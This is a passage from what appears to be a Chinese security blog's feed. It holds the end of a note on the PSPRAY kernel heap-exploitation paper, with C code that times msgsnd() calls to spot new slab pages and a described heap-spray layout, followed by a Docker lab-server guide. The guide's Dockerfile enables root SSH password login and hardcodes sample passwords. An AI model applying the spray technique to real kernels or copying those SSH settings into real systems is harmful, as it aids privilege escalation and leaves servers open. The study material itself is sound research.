function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">del_msg_queue</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msqid_ds</span> <span class="hljs-title">ds_buf</span>;</span><br>    <span class="hljs-keyword">return</span> msgctl(msqid, IPC_RMID, &amp;ds_buf);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">rdtsc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> lo, hi;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;rdtsc&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (lo), <span class="hljs-string">&quot;=d&quot;</span> (hi)</span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">return</span> (((<span class="hljs-type">uint64_t</span>) hi) &lt;&lt; <span class="hljs-number">32</span>) | lo;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">uint64_t</span> exec_time[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        msqid[i] = get_msg_queue();<br>        <span class="hljs-keyword">if</span> (msqid[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to get %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to get msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    *(<span class="hljs-type">size_t</span>*) buf = <span class="hljs-number">123456</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> begin, end;<br><br>        begin = rdtsc();<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to send %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to alloc msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        end = rdtsc();<br><br>        exec_time[i] = end - begin;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to read %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (del_msg_queue(msqid[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to delete %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Execute time for no.%d msgsnd(): %ld\n&quot;</span>, i, exec_time[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果其实还是挺明显的，不过需要注意的是主流发行版的 <code>kmalloc-512</code> 的 slab 大小和我们平时打CTF 用的内核的不一定一样</p><blockquote><p> 笔者真机环境这个是 <code>16</code> 个 512 对象一张 slab，CTF 环境通常是 <code>8</code> 个512 对象一张 slab</p></blockquote><p><img src="https://s2.loli.net/2023/09/16/ZtAB2MvgWib8Qhf.png" alt="image.png"></p><p>不过在笔者看来<strong>我们其实并没有必要使用 PSPRAY 方法进行利用，即没有必要手动获取分配新的 slab 页面的时间</strong>，还是以 OOB 堆喷为例，当堆喷到一定数量级的时候其实都会向 buddy system 请求新的页面，那我们可以简单拆为如下四段式利用：</p><ul><li>首先堆喷大量同大小对象耗空 partial slab，迫使 SLUB 请求新页</li><li>堆喷目标对象，让 SLUB 再取新页</li><li>分配漏洞对象</li><li>堆喷目标对象，让 SLUB 再取新页</li></ul><p>这种方法<strong>本质上与 PSPRAY 所达成的效果一致，因为实质上我们并不需要判断新 slab 页面的分配时间，只需要达成使用目标对象将漏洞对象包裹的效果即可</strong>，这也是笔者所常用的利用技巧之一 ：）</p><blockquote><p>参见笔者出的一道 CTF 题目：<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 - d3kcache</a>，里面便使用了这种方法进行辅助</p></blockquote><p>不过无论如何，$PSPRAY$ 论文的作者确乎向我们展示了一种<strong>非常有趣且实用的漏洞利用技巧</strong>，让笔者受益匪浅</p><blockquote><p><del>希望笔者有一天也能像这群大佬那样发一堆顶会</del></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;🎵THIS IS MY KINGDOM C*M🎵&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x00】使用 Docker 创建隔离的工作环境</title>
    <link href="https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/"/>
    <id>https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/</id>
    <published>2023-08-31T11:55:24.000Z</published>
    <updated>2023-09-26T16:09:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>怎么实验室只有👴一个运维</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>因为笔者目前所在的实验室好像只有笔者一个人会一点点运维技术，<del>大家都喜欢在根目录和各种乱七八糟的目录到处乱拉</del>（错乱），为了保证服务器环境不会哪天用着用着给整个挂掉了，笔者写了一份《服务器安全使用指北》，并顺便拷贝过来水一篇博客（笑）</p></blockquote><h2 id="What-is-docker"><a href="#What-is-docker" class="headerlink" title="What is docker?"></a>What is docker?</h2><blockquote><p>抄自 Wikipedia：</p><p><a href="https://www.docker.com/">Docker</a> 是一个开源的开放平台软件，用于开发应用、交付（shipping）应用和运行应用。Docker 允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度。</p></blockquote><p>按照笔者的理解，Docker 可以简单理解为用于创建<strong>共享操作系统内核虚拟机隔离环境</strong>（称为容器）的工具包：</p><p><img src="https://s2.loli.net/2023/08/31/MYFEIkeyz5iR9t4.png"></p><h2 id="Why-use-docker"><a href="#Why-use-docker" class="headerlink" title="Why use docker?"></a>Why use docker?</h2><p>为了解决服务器环境污染问题（例如配环境把服务器主环境搞崩了，这将同时影响到使用服务器的多个用户），在服务器多人共享的情况下，对于<strong>不涉及内核驱动更改的工作</strong>，推荐使用 docker 创建一个新的隔离环境来完成。</p><h2 id="How-to-install-docker"><a href="#How-to-install-docker" class="headerlink" title="How to install docker?"></a>How to install docker?</h2><blockquote><p><strong>推荐参照官网的安装教程来完成，这里笔者也是使用的官网教程进行安装</strong></p><p>笔者实验室服务器安装了 Ubuntu，其他发行版请参见<a href="https://docs.docker.com/engine/install/ubuntu/">官网教程</a>进行安装</p></blockquote><h3 id="Docker-Engine（推荐）"><a href="#Docker-Engine（推荐）" class="headerlink" title="Docker Engine（推荐）"></a>Docker Engine（推荐）</h3><p>首先通过如下命令卸载可能存在的旧版 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">for</span> pkg <span class="hljs-keyword">in</span> docker.io docker-doc docker-compose podman-docker containerd runc; <span class="hljs-keyword">do</span> sudo apt-get remove <span class="hljs-variable">$pkg</span>; <span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><p>接下来添加 docker 仓库的 GPG key 并进行配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>正式安装 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></code></pre></td></tr></table></figure><p>完成之后可以通过如下命令验证是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run hello-world</span><br></code></pre></td></tr></table></figure><p>将当前用户添加到 docker 用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h3 id="Docker-Desktop（不推荐）"><a href="#Docker-Desktop（不推荐）" class="headerlink" title="Docker Desktop（不推荐）"></a><em>Docker Desktop（不推荐）</em></h3><blockquote><p> Docker Desktop 额外提供了一个 GUI，以及不同用户间的隔离机制，不过 <em>笔者用着感觉不是很 ok</em> ，所以还是推荐传统的纯 Docker Engine</p></blockquote><p>对于非 Gnome 桌面环境而言，需要安装 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install gnome-terminal</span><br></code></pre></td></tr></table></figure><p>卸载可能安装过的 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt remove docker-desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/.docker/desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">rm</span> /usr/local/bin/com.docker.cli</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt purge docker-desktop</span><br></code></pre></td></tr></table></figure><p>设置 docker 仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>下载 docker 安装包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://desktop.docker.com/linux/main/amd64/docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>安装 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ./docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>启动 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user start docker-desktop</span><br></code></pre></td></tr></table></figure><p>将当前用户添加到 docker 用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user restart docker-desktop</span><br></code></pre></td></tr></table></figure><h1 id="0x01-使用-docker-搭建基本的容器环境"><a href="#0x01-使用-docker-搭建基本的容器环境" class="headerlink" title="0x01. 使用 docker 搭建基本的容器环境"></a>0x01. 使用 docker 搭建基本的容器环境</h1><p><strong>若用户未加入 docker 用户组则所有命令开头都需要添加</strong> <strong>sudo</strong> <strong>获得 root 权限</strong></p><h2 id="创建-Docker-镜像"><a href="#创建-Docker-镜像" class="headerlink" title="创建 Docker 镜像"></a>创建 Docker 镜像</h2><p>首先在一个空白的文件夹中创建一个名为 <code>Dockerfile</code> 的文件，写入如下内容：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># 可以在这里预先添加想要安装的软件</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim netcat openssh-server unzip make wget bison flex build-essential curl</span><br><br><span class="hljs-comment"># 开启ssh登录</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># 设置允许密码登录</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># 添加用户密码，这里只是一个示例，根据你的需求自己修改</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:lTaa4cqucW4zxvJswU5KH0HIRM9VmjO7&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:rqUHmfGUtjItWapDuv3NEqwQ9bm6GBrs&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># 添加 ssh 登录，注意换成自己新建的用户的用户名</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这里写你的ssh公钥&quot;</span> &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># 保持 docker 容器运行</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>接下来运行以下命令创建镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t <span class="hljs-string">&quot;自定义镜像名&quot;</span> .</span><br></code></pre></td></tr></table></figure><h2 id="创建并启动-docker-容器"><a href="#创建并启动-docker-容器" class="headerlink" title="创建并启动 docker 容器"></a>创建并启动 <strong>docker 容器</strong></h2><p>完成 docker 镜像创建之后接下来我们就可以开始使用该镜像启动一个新的容器，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> 自定义镜像名</span><br></code></pre></td></tr></table></figure><p>这里添加了一个服务器端口到容器内部 <code>22</code> 端口的映射，从而使得可以从外部直接通过 ssh 连接到容器内部</p><p>如果你的容器不需要主机相关的一些权限，也可以去掉 <code>--privileged</code> 参数</p><h2 id="进入-docker-容器"><a href="#进入-docker-容器" class="headerlink" title="进入 docker 容器"></a>进入 docker 容器</h2><p>进入容器环境有两种办法，一种是通过 container id（可以通过 <code>docker ps</code> 查看，在创建容器时也会打印出容器id），另一种是通过自定义的容器名，这里进入容器后默认是 root 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it 容器名或容器ID /bin/bash</span><br></code></pre></td></tr></table></figure><p>如果想要以容器内部的指定用户身份进入容器，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -u 用户名 -it 容器名或容器ID /bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="从外部连接-docker-容器"><a href="#从外部连接-docker-容器" class="headerlink" title="从外部连接 docker 容器"></a>从外部连接 docker 容器</h2><p>在启动容器时我们已经指定了一个外部端口映射，可以直接通过该端口进行 ssh 连接，操作和正常登录服务器基本一致，不过要手动指定该外部端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh 容器内用户名@服务器主机名或IP -p 自定义的外部端口</span><br></code></pre></td></tr></table></figure><h2 id="删除-docker-容器"><a href="#删除-docker-容器" class="headerlink" title="删除 docker 容器"></a><strong>删除 docker 容器</strong></h2><p>如果 docker 内环境配崩了不想要了，可以简单通过如下命令将该容器进行删除：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker stop 容器ID或容器名</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">rm</span> 容器ID或容器名</span><br></code></pre></td></tr></table></figure><p>重新创建新的容器环境可以直接回到第二步继续进行</p><h2 id="删除-docker-镜像"><a href="#删除-docker-镜像" class="headerlink" title="删除 docker 镜像"></a>删除 docker 镜像</h2><p>如果 docker 镜像构建感觉不够好，可以通过如下命令删除对应镜像（需确保没有容器在使用该镜像）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker rmi 镜像名</span><br></code></pre></td></tr></table></figure><p>后续使用则需要回到第一步从头开始</p><h1 id="0x02-创建可以使用显卡的-docker-环境"><a href="#0x02-创建可以使用显卡的-docker-环境" class="headerlink" title="0x02. 创建可以使用显卡的 docker 环境"></a>0x02. 创建可以使用显卡的 docker 环境</h1><p>有的时候会存在需要在显卡上跑一些任务的需求，本节讲述如何创建一个挂载了显卡的 docker 容器</p><h2 id="What-is-NVIDIA-Container-Toolkit"><a href="#What-is-NVIDIA-Container-Toolkit" class="headerlink" title="What is NVIDIA Container Toolkit ?"></a>What is <code>NVIDIA Container Toolkit</code> ?</h2><p><a href="https://github.com/NVIDIA/nvidia-container-toolkit">NVIDIA Container Toolkit</a> 是由英伟达开发的一套对 docker 进行包装的工具，从而使得 docker 容器可以使用服务器主机上的显卡</p><p><img src="https://s2.loli.net/2023/08/31/dWpAu8LJQ2bOShg.png" alt="image.png"></p><h2 id="安装-NVIDIA-Container-Toolk"><a href="#安装-NVIDIA-Container-Toolk" class="headerlink" title="安装 NVIDIA Container Toolk"></a>安装 NVIDIA Container 